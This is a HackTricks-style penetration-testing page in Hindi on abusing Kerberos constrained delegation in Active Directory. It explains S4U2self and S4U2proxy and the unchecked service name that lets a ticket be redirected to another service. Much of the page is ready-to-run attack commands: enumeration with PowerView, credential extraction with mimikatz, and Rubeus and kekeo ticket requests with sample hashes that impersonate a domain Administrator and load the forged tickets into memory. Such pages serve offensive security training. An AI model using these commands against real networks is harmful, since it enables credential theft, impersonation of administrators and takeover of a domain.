# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

इसका उपयोग करते हुए एक Domain admin एक कंप्यूटर को किसी मशीन की किसी भी **service** के खिलाफ **user या computer** के रूप में **प्रतिनिधित्व करने** की **अनुमति** दे सकता है।

- **Service for User to self (_S4U2self_):** यदि एक **service account** का _userAccountControl_ मान [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) को शामिल करता है, तो यह किसी अन्य उपयोगकर्ता की ओर से अपने लिए (सेवा) एक TGS प्राप्त कर सकता है।
- **Service for User to Proxy(_S4U2proxy_):** एक **service account** किसी उपयोगकर्ता की ओर से **msDS-AllowedToDelegateTo** में सेट की गई सेवा के लिए TGS प्राप्त कर सकता है। ऐसा करने के लिए, इसे पहले उस उपयोगकर्ता से अपने लिए एक TGS की आवश्यकता होती है, लेकिन यह उस अन्य TGS को अनुरोध करने से पहले S4U2self का उपयोग करके उस TGS को प्राप्त कर सकता है।

**Note**: यदि एक उपयोगकर्ता को AD में ‘_Account is sensitive and cannot be delegated_’ के रूप में चिह्नित किया गया है, तो आप **उनका प्रतिनिधित्व करने में असमर्थ** होंगे।

इसका मतलब है कि यदि आप **service का हैश समझौता** करते हैं, तो आप **उपयोगकर्ताओं का प्रतिनिधित्व** कर सकते हैं और उनके नाम पर किसी भी **service** तक **पहुंच** प्राप्त कर सकते हैं (संभव **privesc**)।

इसके अलावा, आपके पास **उस सेवा** तक पहुंच नहीं होगी जिसे उपयोगकर्ता प्रतिनिधित्व कर सकता है, बल्कि किसी भी सेवा तक भी पहुंच होगी क्योंकि SPN (अनुरोधित सेवा का नाम) की जांच नहीं की जा रही है (टिकट में यह भाग एन्क्रिप्टेड/साइन नहीं है)। इसलिए, यदि आपके पास **CIFS service** तक पहुंच है, तो आप उदाहरण के लिए Rubeus में `/altservice` ध्वज का उपयोग करके **HOST service** तक भी पहुंच प्राप्त कर सकते हैं।

इसके अलावा, **DC पर LDAP सेवा की पहुंच**, एक **DCSync** का शोषण करने के लिए आवश्यक है।
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- Step 1: **अनुमत सेवा का TGT प्राप्त करें**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> वहाँ **TGT टिकट** या **RC4** या **AES256** प्राप्त करने के **अन्य तरीके** हैं बिना कंप्यूटर में SYSTEM बने जैसे कि Printer Bug और unconstrained delegation, NTLM relaying और Active Directory Certificate Service का दुरुपयोग
>
> **बस उस TGT टिकट (या हैश किए गए) के साथ आप इस हमले को बिना पूरे कंप्यूटर को समझौता किए कर सकते हैं।**

- Step2: **सेवा के लिए उपयोगकर्ता का अनुकरण करते हुए TGS प्राप्त करें**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**अधिक जानकारी ired.team पर।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
